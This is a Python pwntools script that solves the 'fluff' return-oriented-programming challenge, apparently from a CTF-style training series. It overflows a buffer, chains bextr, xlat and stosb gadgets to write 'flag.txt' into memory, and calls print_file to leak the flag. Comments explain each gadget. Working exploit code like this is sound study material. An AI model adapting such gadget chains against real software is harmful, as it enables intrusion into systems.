from pwn import *
import warnings
warnings.filterwarnings("ignore")

"""
https://stackoverflow.com/questions/28669005/examining-strings-using-gdb

>>> hex(102)
'0x66'
>>> chr(0x66)
'f'

pwndbg> x /d 0x4003c4
0x4003c4:	102

0x4003c4 f
0x400239 l
0x4003d6 a
0x4003cf g
0x40024e .
0x400192 t
0x400246 x
0x400192 t
"""

def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] +argv, *a, **kw)

gdbscript = '''
init-pwndbg
continue
'''.format(**locals())

exe = './fluff'
elf = context.binary = ELF(exe, checksec=False)
context.log_level = 'info'
context.delete_corefiles = True

io = start()
payload = cyclic(100)
io.sendlineafter('> ', payload)
io.wait()

core = io.corefile
rax_register = int(str(hex(core.rax)[2:]),16)
esp = core.rsp
four_byte_pattern = core.read(esp, 4)

"""
0x000000000040062a <+2>:	pop    rdx
0x000000000040062b <+3>:	pop    rcx
0x000000000040062c <+4>:	add    rcx,0x3ef2
0x0000000000400633 <+11>:	bextr  rbx,rcx,rdx
0x0000000000400638 <+16>:	ret 

rbx: first (destination operand)
rcx: second (first source operand)
rdx: third (second source operand)

rdx: ( yyyy yyyy | xxxx xxxx ) -> yyyyyyyy is for maximum number of bits beginning from START position to extract; xxxxxxxx is starting bit position of bit extraction
rcx: From the xxxxxxxx bit, transfer the bits up till yyyyyyyy to rbx
"""

"""
0x0000000000400628 <+0>:	xlat   BYTE PTR ds:[rbx]
0x0000000000400629 <+1>:	ret 
"""

"""
0x0000000000400639: stosb byte ptr [rdi], al; ret; 
"""

string_to_write = b"flag.txt"
char_locations = []
for char in string_to_write:
    char_addr = hex(read("fluff").find(char) + elf.address)
    char_locations.append(char_addr)
    print(char_addr)


"""
https://www.felixcloutier.com/x86/bextr https://stackoverflow.com/questions/70208751/how-does-the-bextr-instruction-in-x86-work
https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm 
https://stackoverflow.com/questions/47556705/what-does-xlat-instruction-do-in-8086 
https://pdos.csail.mit.edu/6.828/2017/readings/i386/XLAT.htm
https://www.tutorialspoint.com/assembly_programming/assembly_stos_instruction.htm https://www.tutorialspoint.com/assembly_programming/assembly_registers.htm
https://stackoverflow.com/questions/47823786/assembly-byte-ptr-meaning
1 byte = 8 bits = 2 hexadecimals
"""
data = 0x0000000000601028
pop_rdx_pop_rcx_add_rcx_0x3ef2_bextr_rbx_rcx_rdx_gadget = 0x000000000040062a
xlat_rbx = 0x0000000000400628 # Shift add rbx to al (eax) (rax)
stos_rdi_al = 0x0000000000400639 # swap 1 byte from rdi to eax
pop_rdi = 0x00000000004006a3
print_file = 0x400510

exploit = b""

current_rax = rax_register

for i, c in enumerate(char_locations):
    if i != 0:
        current_rax = string_to_write[i-1]

    exploit += p64(pop_rdx_pop_rcx_add_rcx_0x3ef2_bextr_rbx_rcx_rdx_gadget)
    '''
    this will go to rdx. 0x4000 are hexadecimals and each value takes up 4 bits, hence it is actually 0200 0000 0000 0000. 40 is the maximum number of bits while 0 is the start bit for extraction
    '''
    exploit += p64(0x2000)
    '''
    rcx which will go to rbx
    '''
    exploit += p64(int(c,16) - current_rax - 0x3ef2)
    '''
    after running the gadget, the output destination register is at rbx. using xlat, we "add" rbx to (al) rax, hence we need to minus the current value of rax in the previous string. [rbx] is interpreted as a memory location which 
    points to a character of "flag.txt" which takes up 1 byte each. So after xlat, al should contain the character of "flag.txt" itself
    '''
    exploit += p64(xlat_rbx)
    exploit += p64(pop_rdi)
    exploit += p64(data + i)
    '''
    swap the first 8 bits of rdi register which points to the data section with the data containing in the rax registser
    '''
    exploit += p64(stos_rdi_al)

payload = flat(
    asm('nop') * 40,  
    exploit,
    pop_rdi,
    data,
    print_file
)

write("payload", payload)
io = start()
io.sendlineafter('> ', payload)
#io.interactive()

io.recvuntil('Thank you!\n')
flag = io.recv()
success(flag)

